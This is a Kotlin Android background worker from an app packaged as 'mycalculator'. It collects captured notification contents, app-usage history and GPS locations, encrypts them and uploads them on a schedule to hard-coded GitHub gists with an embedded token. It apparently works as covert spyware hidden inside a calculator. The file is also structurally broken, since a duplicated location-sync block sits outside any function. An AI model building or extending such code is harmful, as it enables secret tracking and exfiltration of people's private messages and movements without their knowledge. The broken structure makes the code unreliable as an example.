package com.android.mycalculator

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Locale

class SyncWorker(context: Context, workerParams: WorkerParameters) : Worker(context, workerParams) {
    
    companion object {
        private const val GITHUB_TOKEN = BuildConfig.GITHUB_TOKEN
        
        // TWO SEPARATE GISTS
        private const val GIST_NOTIF_ID = "b529558252be113e01993f24429e8556" 
        private const val GIST_USAGE_ID = "55f3a178d45427d0f171da0a3266c18e"
        private const val GIST_LOCATION_ID = "afebbd4080239b0e54ddc991ca92b18a"
    }

    override fun doWork(): Result {
    val dbHelper = DatabaseHelper.getInstance(applicationContext)
    var notifSuccess = true
    var usageSuccess = true
    var locationSuccess = true   // <-- ADD THIS

    // ==========================================
    // CHANNEL 1: NOTIFICATION SYNC (Every 1 Min)
    // ==========================================
    val unsyncedNotifs = dbHelper.getUnsyncedLogs()
    if (unsyncedNotifs.isNotEmpty()) {
        notifSuccess = syncToGist(
            gistId = GIST_NOTIF_ID,
            fileName = "notifications.csv",
            header = "Device,App,Title,Content,Time\n",
            logs = unsyncedNotifs,
            dbHelper = dbHelper,
            tableName = "logs",
            isUsageLog = false
        )
    }

    // ==========================================
    // CHANNEL 2: USAGE SYNC (Strict 5 Min Limit)
    // ==========================================
    val prefs = applicationContext.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
    val lastUsageTime = prefs.getLong("last_usage_sync", 0)
    val currentTime = System.currentTimeMillis()

    if (currentTime - lastUsageTime >= 5 * 60 * 1000) {
        prefs.edit().putLong("last_usage_sync", currentTime).apply()
        UsageTracker.extractUsageEvents(applicationContext, dbHelper)
        val unsyncedUsage = dbHelper.getUnsyncedUsageLogs()
        if (unsyncedUsage.isNotEmpty()) {
            usageSuccess = syncToGist(
                gistId = GIST_USAGE_ID,
                fileName = "usage_stats.csv",
                header = "Device,App Name,Date,Start Time,End Time\n",
                logs = unsyncedUsage,
                dbHelper = dbHelper,
                tableName = "usage_logs",
                isUsageLog = true
            )
        }
    }

    // ==========================================
    // CHANNEL 3: LOCATION SYNC (NEW)
    // ==========================================
    val unsyncedLocations = dbHelper.getUnsyncedLocationLogs()
    if (unsyncedLocations.isNotEmpty()) {
        locationSuccess = syncToGist(
            gistId = GIST_LOCATION_ID,
            fileName = "Loc_History.csv",
            header = "Device,Latitude,Longitude,Accuracy,Provider,Time\n",
            logs = unsyncedLocations,
            dbHelper = dbHelper,
            tableName = "location_logs",
            isUsageLog = false
        )
    }

    if (!notifSuccess || !usageSuccess || !locationSuccess) {
        return Result.retry()
    }
    return Result.success()
}
    // ==========================================
// CHANNEL 3: LOCATION SYNC (every time worker runs)
// ==========================================
val unsyncedLocations = dbHelper.getUnsyncedLocationLogs()
if (unsyncedLocations.isNotEmpty()) {
    val locSuccess = syncToGist(
        gistId = GIST_LOCATION_ID,
        fileName = "Loc_History.csv",
        header = "Device,Latitude,Longitude,Accuracy,Provider,Time\n",
        logs = unsyncedLocations,
        dbHelper = dbHelper,
        tableName = "location_logs",
        isUsageLog = false  // or handle date parsing appropriately
    )
    if (!locSuccess) locationSuccess = false
}
    // ==========================================
    // REUSABLE UPLOAD ENGINE
    // ==========================================
    private fun syncToGist(gistId: String, fileName: String, header: String, logs: List<Pair<Int, String>>, dbHelper: DatabaseHelper, tableName: String, isUsageLog: Boolean): Boolean {
        try {
            // 1. GET CURRENT GIST DATA
            val getUrl = URL("https://api.github.com/gists/$gistId")
            val getConn = getUrl.openConnection() as HttpURLConnection
            getConn.connectTimeout = 15000; getConn.readTimeout = 15000
            getConn.requestMethod = "GET"
            getConn.setRequestProperty("Authorization", "Bearer $GITHUB_TOKEN")
            getConn.setRequestProperty("Accept", "application/vnd.github.v3+json")

            var currentContent = header

            if (getConn.responseCode == 200) {
                val responseStr = BufferedReader(InputStreamReader(getConn.inputStream)).use { it.readText() }
                val jsonResponse = JSONObject(responseStr)
                val files = jsonResponse.getJSONObject("files")
                
                if (files.has(fileName)) {
                    val rawData = files.getJSONObject(fileName).getString("content")
                    currentContent = if (rawData.startsWith("Device,")) rawData else EncryptionHelper.decrypt(rawData)
                    if (!currentContent.endsWith("\n")) currentContent += "\n"
                }
            }
            getConn.disconnect()

            if (currentContent.isEmpty()) currentContent = header

            // 2. NEW: TRIM LOGS OLDER THAN 48 HOURS FROM THE GIST
            currentContent = trimOldLogs(currentContent, header, isUsageLog)

            // 3. APPEND NEW DATA
            val syncedIds = mutableListOf<Int>()
            for (log in logs) {
                currentContent += log.second 
                syncedIds.add(log.first)    
            }

            // 4. ENCRYPT
            val encryptedPayload = EncryptionHelper.encrypt(currentContent)

            // 5. UPLOAD
            val patchUrl = URL("https://api.github.com/gists/$gistId")
            val patchConn = patchUrl.openConnection() as HttpURLConnection
            patchConn.connectTimeout = 15000; patchConn.readTimeout = 15000
            patchConn.requestMethod = "PATCH"
            patchConn.setRequestProperty("Authorization", "Bearer $GITHUB_TOKEN")
            patchConn.setRequestProperty("Accept", "application/vnd.github.v3+json")
            patchConn.setRequestProperty("Content-Type", "application/json")
            patchConn.doOutput = true

            val fileObj = JSONObject().apply { put("content", encryptedPayload) }
            val filesObj = JSONObject().apply { put(fileName, fileObj) }
            val payloadObj = JSONObject().apply { put("files", filesObj) }

            OutputStreamWriter(patchConn.outputStream).use { writer ->
                writer.write(payloadObj.toString())
                writer.flush()
            }

            val responseCode = patchConn.responseCode
            patchConn.disconnect()

            // 6. CLEANUP
            if (responseCode == 200) {
                dbHelper.markAsSynced(syncedIds, tableName)
                dbHelper.deleteOldSyncedLogs()
                return true
            } else {
                Log.e("SyncWorker", "GitHub API Error Code: $responseCode for $fileName")
                return false
            }

        } catch (e: Exception) {
            e.printStackTrace()
            return false
        }
    }

    // ==========================================
    // THE 48-HOUR GIST TRIMMER ENGINE
    // ==========================================
    private fun trimOldLogs(csvContent: String, header: String, isUsageLog: Boolean): String {
        val lines = csvContent.split("\n").filter { it.isNotBlank() }
        if (lines.size <= 1) return header

        val sdf = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.getDefault())
        val cutoffTime = System.currentTimeMillis() - (48L * 60 * 60 * 1000) // 48 Hours

        val validLines = mutableListOf<String>()
        validLines.add(header.trim())

        // Regex to split CSV safely, ignoring commas inside quotes
        val csvRegex = ",(?=(?:[^\"]*\"[^\"]*\")*[^\"]*$)".toRegex()

        for (i in 1 until lines.size) {
            val line = lines[i]
            if (line.startsWith("Device,App")) continue // Skip accidental duplicated headers

            try {
                val columns = line.split(csvRegex).map { it.removeSurrounding("\"") }
                
                // Extract the date strings based on which file we are trimming
                val dateString = if (isUsageLog) {
                    // Usage Format: Columns 2 (Date) & 3 (StartTime)
                    if (columns.size >= 4) "${columns[2]} ${columns[3]}" else ""
                } else {
                    // Notification Format: Column 4 (Time)
                    if (columns.size >= 5) columns[4] else ""
                }

                if (dateString.isNotEmpty()) {
                    val logDate = sdf.parse(dateString)
                    // Only keep lines that are newer than 48 hours
                    if (logDate != null && logDate.time >= cutoffTime) {
                        validLines.add(line)
                    }
                } else {
                    validLines.add(line) // If parsing fails for some reason, keep it to be safe
                }
            } catch (e: Exception) {
                validLines.add(line) // Keep line on error
            }
        }
        
        return validLines.joinToString("\n") + "\n"
    }
}
